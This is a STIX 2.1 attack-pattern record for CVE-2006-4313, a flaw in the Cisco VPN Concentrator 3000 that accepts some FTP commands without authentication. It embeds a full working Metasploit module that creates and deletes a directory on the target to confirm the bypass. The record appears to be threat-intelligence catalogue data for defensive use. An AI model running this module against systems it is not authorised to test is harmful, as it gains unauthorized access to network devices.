{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--2929be0c-1b1f-4c6d-a22e-f36810012d13",
    "created": "2024-08-14T16:24:17.100221Z",
    "modified": "2024-08-14T16:24:17.100224Z",
    "name": "Cisco VPN Concentrator 3000 FTP Unauthorized Administrative Access",
    "description": " This module tests for a logic vulnerability in the Cisco VPN Concentrator 3000 series. It is possible to execute some FTP statements without authentication (CWD, RNFR, MKD, RMD, SIZE, CDUP). It also appears to have some memory leak bugs when working with CWD commands. This module simply creates an arbitrary directory verifies that the directory has been created, then deletes it and verifies deletion to confirm the bug. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/networking/cisco_vpn_3000_ftp_bypass.rb",
            "external_id": "cisco_vpn_3000_ftp_bypass.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2006-4313"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::Deprecated\n  moved_from 'auxiliary/admin/cisco/vpn_3000_ftp_bypass'\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Cisco VPN Concentrator 3000 FTP Unauthorized Administrative Access',\n        'Description' => %q{\n          This module tests for a logic vulnerability in the Cisco VPN Concentrator\n          3000 series. It is possible to execute some FTP statements without authentication\n          (CWD, RNFR, MKD, RMD, SIZE, CDUP). It also appears to have some memory leak bugs\n          when working with CWD commands. This module simply creates an arbitrary directory,\n          verifies that the directory has been created, then deletes it and verifies deletion\n          to confirm the bug.\n        },\n        'Author'\t=> [ 'aushack' ],\n        'License'\t=> MSF_LICENSE,\n        'References' => [\n          [ 'BID', '19680' ],\n          [ 'CVE', '2006-4313' ],\n          [ 'OSVDB', '28139' ],\n          [ 'OSVDB', '28138' ]\n        ],\n        'DisclosureDate' => '2006-08-23',\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [],\n          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]\n        }\n      )\n    )\n\n    register_options(\n      [\n        Opt::RPORT(21),\n      ]\n    )\n  end\n\n  def run\n    connect\n    res = sock.get_once\n    if (res && res =~ /220 Session will be terminated after/)\n      print_status('Target appears to be a Cisco VPN Concentrator 3000 series.')\n\n      test = Rex::Text.rand_text_alphanumeric(8)\n\n      print_status(\"Attempting to create directory: MKD #{test}\")\n      sock.put(\"MKD #{test}\\r\\n\")\n      res = sock.get_once(-1, 5)\n\n      if (res =~ /257 MKD command successful\\./)\n        print_status(\"\\tDirectory #{test} reportedly created. Verifying with SIZE #{test}\")\n        sock.put(\"SIZE #{test}\\r\\n\")\n        res = sock.get_once(-1, 5)\n        if (res =~ /550 Not a regular file/)\n          print_status(\"\\tServer reports \\\"not a regular file\\\". Directory verified.\")\n          print_status(\"\\tAttempting to delete directory: RMD #{test}\")\n          sock.put(\"RMD #{test}\\r\\n\")\n          res = sock.get_once(-1, 5)\n          if (res =~ /250 RMD command successful\\./)\n            print_status(\"\\tDirectory #{test} reportedly deleted. Verifying with SIZE #{test}\")\n            sock.put(\"SIZE #{test}\\r\\n\")\n            sock.get_once(-1, 5)\n            print_status(\"\\tDirectory #{test} no longer exists!\")\n            print_status('Target is confirmed as vulnerable!')\n          end\n        end\n      end\n    else\n      print_status('Target is either not Cisco or the target has been patched.')\n    end\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2006-08-23"
}